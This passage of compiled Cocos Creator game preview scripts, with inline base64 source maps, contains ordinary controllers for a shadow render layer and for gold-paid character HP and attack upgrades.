ZVwiKVxyXG5cclxuICAgICAgICBXb3JsZC5TdG9yYWdlLl92aWRlb1NpZ249MVxyXG4gICAgICAgIFdvcmxkLlN0b3JhZ2UudmlkZW9BZF9zaG93KCkgXHJcbiAgICB9XHJcblxyXG4gICAgb25DbGlja1VzZURvKCkge1xyXG4gICAgICAgIFdvcmxkLk15LnByb3BJbmZvLnVzZSh0aGlzLl9wcm9wSWQpO1xyXG4gICAgICAgIHRoaXMubm9kZS5kZXN0cm95KCk7XHJcbiAgICB9XHJcblxyXG4gICAgb25DbGlja05vVXNlKGV2ZW50LCBkYXRhKXtcclxuICAgICAgICBjb25zb2xlLmxvZyhcIuOAkGNsaWNr44CRUmVjb21tZW5kUHJvcHNDb250cm9sbGVyIE5vVXNlXCIpXHJcblxyXG4gICAgICAgIHRoaXMubm9kZS5kZXN0cm95KCk7XHJcbiAgICB9XHJcbn1cclxuIl19
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/home/ShadowLayerController.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '6fe32R8NilNCJIY/KYNM8S+', 'ShadowLayerController');
// script/app/home/ShadowLayerController.ts

Object.defineProperty(exports, "__esModule", { value: true });
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var ShadowLayerController = /** @class */ (function (_super) {
    __extends(ShadowLayerController, _super);
    function ShadowLayerController() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this.shadowCamera = null;
        _this.sprite = null;
        return _this;
    }
    ShadowLayerController.prototype.onLoad = function () {
        /** 设置影子(角色和敌人) */
        var texture = new cc.RenderTexture();
        texture.initWithSize(cc.visibleRect.width, cc.visibleRect.height);
        this.shadowCamera.targetTexture = texture;
        // texture['_premultiplyAlpha'] = true;
        this.sprite.spriteFrame = new cc.SpriteFrame(texture);
        // this.sprite.spriteFrame.srcBlendFactor = cc.macro.BlendFactor.ONE;
        // this.sprite.setState(cc.Sprite.State.GRAY);
        this.sprite.node.color = cc.Color.BLACK;
        this.sprite.node.opacity = 100;
    };
    __decorate([
        property(cc.Camera)
    ], ShadowLayerController.prototype, "shadowCamera", void 0);
    __decorate([
        property(cc.Sprite)
    ], ShadowLayerController.prototype, "sprite", void 0);
    ShadowLayerController = __decorate([
        ccclass
    ], ShadowLayerController);
    return ShadowLayerController;
}(cc.Component));
exports.default = ShadowLayerController;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2hvbWUvU2hhZG93TGF5ZXJDb250cm9sbGVyLnRzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiI7Ozs7Ozs7Ozs7Ozs7Ozs7QUFDTSxJQUFBLEtBQXNCLEVBQUUsQ0FBQyxVQUFVLEVBQWxDLE9BQU8sYUFBQSxFQUFFLFFBQVEsY0FBaUIsQ0FBQztBQUcxQztJQUFtRCx5Q0FBWTtJQUEvRDtRQUFBLHFFQXFCQztRQWxCRyxrQkFBWSxHQUFhLElBQUksQ0FBQztRQUc5QixZQUFNLEdBQWEsSUFBSSxDQUFDOztJQWU1QixDQUFDO0lBWkcsc0NBQU0sR0FBTjtRQUNJLGtCQUFrQjtRQUNsQixJQUFJLE9BQU8sR0FBRyxJQUFJLEVBQUUsQ0FBQyxhQUFhLEVBQUUsQ0FBQztRQUNyQyxPQUFPLENBQUMsWUFBWSxDQUFDLEVBQUUsQ0FBQyxXQUFXLENBQUMsS0FBSyxFQUFFLEVBQUUsQ0FBQyxXQUFXLENBQUMsTUFBTSxDQUFDLENBQUM7UUFDbEUsSUFBSSxDQUFDLFlBQVksQ0FBQyxhQUFhLEdBQUcsT0FBTyxDQUFDO1FBQzFDLHVDQUF1QztRQUN2QyxJQUFJLENBQUMsTUFBTSxDQUFDLFdBQVcsR0FBRyxJQUFJLEVBQUUsQ0FBQyxXQUFXLENBQUMsT0FBTyxDQUFDLENBQUM7UUFDdEQscUVBQXFFO1FBQ3JFLDhDQUE4QztRQUM5QyxJQUFJLENBQUMsTUFBTSxDQUFDLElBQUksQ0FBQyxLQUFLLEdBQUUsRUFBRSxDQUFDLEtBQUssQ0FBQyxLQUFLLENBQUM7UUFDdkMsSUFBSSxDQUFDLE1BQU0sQ0FBQyxJQUFJLENBQUMsT0FBTyxHQUFHLEdBQUcsQ0FBQztJQUNuQyxDQUFDO0lBakJEO1FBREMsUUFBUSxDQUFDLEVBQUUsQ0FBQyxNQUFNLENBQUM7K0RBQ1U7SUFHOUI7UUFEQyxRQUFRLENBQUMsRUFBRSxDQUFDLE1BQU0sQ0FBQzt5REFDSTtJQU5QLHFCQUFxQjtRQUR6QyxPQUFPO09BQ2EscUJBQXFCLENBcUJ6QztJQUFELDRCQUFDO0NBckJELEFBcUJDLENBckJrRCxFQUFFLENBQUMsU0FBUyxHQXFCOUQ7a0JBckJvQixxQkFBcUIiLCJmaWxlIjoiIiwic291cmNlUm9vdCI6Ii8iLCJzb3VyY2VzQ29udGVudCI6WyJcclxuY29uc3Qge2NjY2xhc3MsIHByb3BlcnR5fSA9IGNjLl9kZWNvcmF0b3I7XHJcblxyXG5AY2NjbGFzc1xyXG5leHBvcnQgZGVmYXVsdCBjbGFzcyBTaGFkb3dMYXllckNvbnRyb2xsZXIgZXh0ZW5kcyBjYy5Db21wb25lbnQge1xyXG5cclxuICAgIEBwcm9wZXJ0eShjYy5DYW1lcmEpXHJcbiAgICBzaGFkb3dDYW1lcmE6Y2MuQ2FtZXJhID0gbnVsbDtcclxuXHJcbiAgICBAcHJvcGVydHkoY2MuU3ByaXRlKVxyXG4gICAgc3ByaXRlOmNjLlNwcml0ZSA9IG51bGw7XHJcblxyXG5cclxuICAgIG9uTG9hZCAoKSB7XHJcbiAgICAgICAgLyoqIOiuvue9ruW9seWtkCjop5LoibLlkozmlYzkuropICovXHJcbiAgICAgICAgbGV0IHRleHR1cmUgPSBuZXcgY2MuUmVuZGVyVGV4dHVyZSgpO1xyXG4gICAgICAgIHRleHR1cmUuaW5pdFdpdGhTaXplKGNjLnZpc2libGVSZWN0LndpZHRoLCBjYy52aXNpYmxlUmVjdC5oZWlnaHQpO1xyXG4gICAgICAgIHRoaXMuc2hhZG93Q2FtZXJhLnRhcmdldFRleHR1cmUgPSB0ZXh0dXJlO1xyXG4gICAgICAgIC8vIHRleHR1cmVbJ19wcmVtdWx0aXBseUFscGhhJ10gPSB0cnVlO1xyXG4gICAgICAgIHRoaXMuc3ByaXRlLnNwcml0ZUZyYW1lID0gbmV3IGNjLlNwcml0ZUZyYW1lKHRleHR1cmUpO1xyXG4gICAgICAgIC8vIHRoaXMuc3ByaXRlLnNwcml0ZUZyYW1lLnNyY0JsZW5kRmFjdG9yID0gY2MubWFjcm8uQmxlbmRGYWN0b3IuT05FO1xyXG4gICAgICAgIC8vIHRoaXMuc3ByaXRlLnNldFN0YXRlKGNjLlNwcml0ZS5TdGF0ZS5HUkFZKTtcclxuICAgICAgICB0aGlzLnNwcml0ZS5ub2RlLmNvbG9yPSBjYy5Db2xvci5CTEFDSztcclxuICAgICAgICB0aGlzLnNwcml0ZS5ub2RlLm9wYWNpdHkgPSAxMDA7XHJcbiAgICB9XHJcbn1cclxuIl19
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/home/RoleLayerController.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'f61265lNHFLoLCiFgJtZAnX', 'RoleLayerController');
// script/app/home/RoleLayerController.ts

Object.defineProperty(exports, "__esModule", { value: true });
var World_1 = require("../info/World");
var ExcelConfig_1 = require("../../../framework/config/ExcelConfig");
var ExcelTableNames_1 = require("../config/ExcelTableNames");
var Extend_1 = require("../../../framework/extend/Extend");
var Facade_1 = require("../../../framework/facade/Facade");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var RoleLayerController = /** @class */ (function (_super) {
    __extends(RoleLayerController, _super);
    function RoleLayerController() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this.hpLvLabel = null;
        _this.adLvLabel = null;
        _this.hpCostLabel = null;
        _this.adCostLabel = null;
        _this.hpWorthLabel = null;
        _this.adWorthLabel = null;
        _this.hpLvButton = null;
        _this.adButton = null;
        _this._AdUpCount = 0;
        return _this;
    }
    RoleLayerController.prototype.onLoad = function () {
        this.updateHpUp();
        this.updateAdUp();
        cc.find('Canvas').on("UpdateStorage", this.onUpdateStorageEvent, this);
    };
    RoleLayerController.prototype.onDestroy = function () {
        cc.find('Canvas').off("UpdateStorage", this.onUpdateStorageEvent, this);
    };
    RoleLayerController.prototype.onUpdateStorageEvent = function (key) {
        if (key == "goldCount") {
            var config = ExcelConfig_1.ExcelConfig.getExcelTable(ExcelTableNames_1.ExcelTableNames.Weapon)[0];
            if (World_1.World.Storage.HpLv < config['lv_limit']) {
                var needCost = ExcelConfig_1.ExcelConfig.getExcelTable(ExcelTableNames_1.ExcelTableNames.WeaponUp)[World_1.World.Storage.HpLv - 1]['life_expend'];
                this.hpLvButton.interactable = World_1.World.Storage.goldCount >= needCost;
                this.hpCostLabel.node.color = this.hpLvButton.interactable ? cc.Color.WHITE : cc.Color.RED.fromHEX("#924338");
            }
            if (World_1.World.Storage.ADLv < config['lv_limit']) {
                var needCost = ExcelConfig_1.ExcelConfig.getExcelTable(ExcelTableNames_1.ExcelTableNames.WeaponUp)[World_1.World.Storage.ADLv - 1]['fight_expend'];
                this.adButton.interactable = World_1.World.Storage.goldCount >= needCost;
                this.adCostLabel.node.color = this.adButton.interactable ? cc.Color.WHITE : cc.Color.RED.fromHEX("#924338");
            }
        }
    };
    RoleLayerController.prototype.updateHpUp = function () {
        var config = ExcelConfig_1.ExcelConfig.getExcelTable(ExcelTableNames_1.ExcelTableNames.Weapon)[0];
        this.hpLvLabel.string = "<b><outline color=#1e1e1e width=4>\u751F\u547D\u529BLv." + World_1.World.Storage.HpLv + "</outline></b>";
        if (World_1.World.Storage.HpLv >= config['lv_limit']) {
            this.hpCostLabel.string = "<b><outline color=#1e1e1e width=3>\u6EE1\u7EA7</outline></b>";
            this.hpLvButton.interactable = false;
        }
        else {
            var needCost = ExcelConfig_1.ExcelConfig.getExcelTable(ExcelTableNames_1.ExcelTableNames.WeaponUp)[World_1.World.Storage.HpLv - 1]['life_expend'];
            this.hpCostLabel.string = "<b><outline color=#1e1e1e width=3>" + Extend_1.ext.shortFormat(needCost) + "</outline></b>";
            this.hpLvButton.interactable = World_1.World.Storage.goldCount >= needCost;
        }
        this.hpCostLabel.node.color = this.hpLvButton.interactable ? cc.Color.WHITE : cc.Color.RED.fromHEX("#924338");
        var life = ExcelConfig_1.ExcelConfig.getExcelTable(ExcelTableNames_1.ExcelTableNames.WeaponUp)[World_1.World.Storage.HpLv - 1]['life'];
        this.hpWorthLabel.string = "<b><outline color=#1e1e1e width=3>" + Extend_1.ext.shortFormat(life) + "</outline></b>";
    };
    RoleLayerController.prototype.updateAdUp = function () {
        var config = ExcelConfig_1.ExcelConfig.getExcelTable(ExcelTableNames_1.ExcelTableNames.Weapon)[0];
        this.adLvLabel.string = "<b><outline color=#1e1e1e width=4>\u6218\u529BLv." + World_1.World.Storage.ADLv + "</outline></b>";
        if (World_1.World.Storage.ADLv >= config['lv_limit']) {
            this.adCostLabel.string = "<b><outline color=#1e1e1e width=3>\u6EE1\u7EA7</outline></b>";
            this.adButton.interactable = false;
        }
        else {
            var needCost = ExcelConfig_1.ExcelConfig.getExcelTable(ExcelTableNames_1.ExcelTableNames.WeaponUp)[World_1.World.Storage.ADLv - 1]['fight_expend'];
            this.adCostLabel.string = "<b><outline color=#1e1e1e width=3>" + Extend_1.ext.shortFormat(needCost) + "</outline></b>";
            this.adButton.interactable = World_1.World.Storage.goldCount >= needCost;
        }
        this.adCostLabel.node.color = this.adButton.interactable ? cc.Color.WHITE : cc.Color.RED.fromHEX("#924338");
        var fight = ExcelConfig_1.ExcelConfig.getExcelTable(ExcelTableNames_1.ExcelTableNames.WeaponUp)[World_1.World.Storage.ADLv - 1]['fight'];
        this.adWorthLabel.string = "<b><outline color=#1e1e1e width=3>" + Extend_1.ext.shortFormat(fight) + "</outline></b>";
    };
    RoleLayerController.prototype.onClickUpHpLv = function (event, data) {
        console.log("【click】RoleLayerController UpHpLv");
        var needCost = ExcelConfig_1.ExcelConfig.getExcelTable(ExcelTableNames_1.ExcelTableNames.WeaponUp)[World_1.World.Storage.HpLv - 1]['life_expend'];
        World_1.World.Storage.goldCount -= needCost;
        World_1.World.Storage.HpLv++;
        this.updateHpUp();
        Facade_1.default.canvasNode.emit("RoleUp");
    };
    RoleLayerController.prototype.onClickUpADLv = function (event, data) {
        console.log("【click】RoleLayerController UpADLv");
        var needCost = ExcelConfig_1.ExcelConfig.getExcelTable(ExcelTableNames_1.ExcelTableNames.WeaponUp)[World_1.World.Storage.ADLv - 1]['fight_expend'];
        World_1.World.Storage.goldCount -= needCost;
        World_1.World.Storage.ADLv++;
        this.updateAdUp();
        Facade_1.default.canvasNode.emit("RoleUp");
        this._AdUpCount++;
        var newbieNode = cc.director.getScene().getChildByName("newbieNode");
        if (newbieNode && (!this.adButton.interactable || this._AdUpCount > 2)) {
            newbieNode.destroy();
            World_1.World.My.newbies.finish("FirstRoleUp");
        }
    };
    __decorate([
        property(cc.RichText)
    ], RoleLayerController.prototype, "hpLvLabel", void 0);
    __decorate([
        property(cc.RichText)
    ], RoleLayerController.prototype, "adLvLabel", void 0);
    __decorate([
        property(cc.RichText)
    ], RoleLayerController.prototype, "hpCostLabel", void 0);
    __decorate([
        property(cc.RichText)
    ], RoleLayerController.prototype, "adCostLabel", void 0);
    __decorate([
        property(cc.RichText)
    ], RoleLayerController.prototype, "hpWorthLabel", void 0);
    __decorate([
        property(cc.RichText)
    ], RoleLayerController.prototype, "adWorthLabel", void 0);
    __decorate([
        property(cc.Button)
    ], RoleLayerController.prototype, "hpLvButton", void 0);
    __decorate([
        property(cc.Button)
    ], RoleLayerController.prototype, "adButton", void 0);
    RoleLayerController = __decorate([
        ccclass
    ], RoleLayerController);
    return RoleLayerController;
}(cc.Component));
exports.default = RoleLayerController;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2hvbWUvUm9sZUxheWVyQ29udHJvbGxlci50cyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiOzs7Ozs7Ozs7Ozs7Ozs7O0FBQ0EsdUNBQW9DO0FBR3BDLHFFQUFrRTtBQUNsRSw2REFBMEQ7QUFDMUQsMkRBQXFEO0FBQ3JELDJEQUFzRDtBQUVoRCxJQUFBLEtBQXNCLEVBQUUsQ0FBQyxVQUFVLEVBQWxDLE9BQU8sYUFBQSxFQUFFLFFBQVEsY0FBaUIsQ0FBQztBQUcxQztJQUFpRCx1Q0FBWTtJQUE3RDtRQUFBLHFFQWdIQztRQTdHRyxlQUFTLEdBQWdCLElBQUksQ0FBQztRQUc5QixlQUFTLEdBQWdCLElBQUksQ0FBQztRQUc5QixpQkFBVyxHQUFnQixJQUFJLENBQUM7UUFHaEMsaUJBQVcsR0FBZ0IsSUFBSSxDQUFDO1FBR2hDLGtCQUFZLEdBQWUsSUFBSSxDQUFDO1FBR2hDLGtCQUFZLEdBQWUsSUFBSSxDQUFDO1FBR2hDLGdCQUFVLEdBQWEsSUFBSSxDQUFDO1FBRzVCLGNBQVEsR0FBYSxJQUFJLENBQUM7UUFzRWxCLGdCQUFVLEdBQUcsQ0FBQyxDQUFDOztJQWtCM0IsQ0FBQztJQXRGRyxvQ0FBTSxHQUFOO1FBQ0ksSUFBSSxDQUFDLFVBQVUsRUFBRSxDQUFDO1FBQ2xCLElBQUksQ0FBQyxVQUFVLEVBQUUsQ0FBQztRQUNsQixFQUFFLENBQUMsSUFBSSxDQUFDLFFBQVEsQ0FBQyxDQUFDLEVBQUUsQ0FBQyxlQUFlLEVBQUUsSUFBSSxDQUFDLG9CQUFvQixFQUFFLElBQUksQ0FBQyxDQUFDO0lBQzNFLENBQUM7SUFFRCx1Q0FBUyxHQUFUO1FBQ0ksRUFBRSxDQUFDLElBQUksQ0FBQyxRQUFRLENBQUMsQ0FBQyxHQUFHLENBQUMsZUFBZSxFQUFFLElBQUksQ0FBQyxvQkFBb0IsRUFBRSxJQUFJLENBQUMsQ0FBQztJQUM1RSxDQUFDO0lBRUQsa0RBQW9CLEdBQXBCLFVBQXFCLEdBQVU7UUFDM0IsSUFBSSxHQUFHLElBQUks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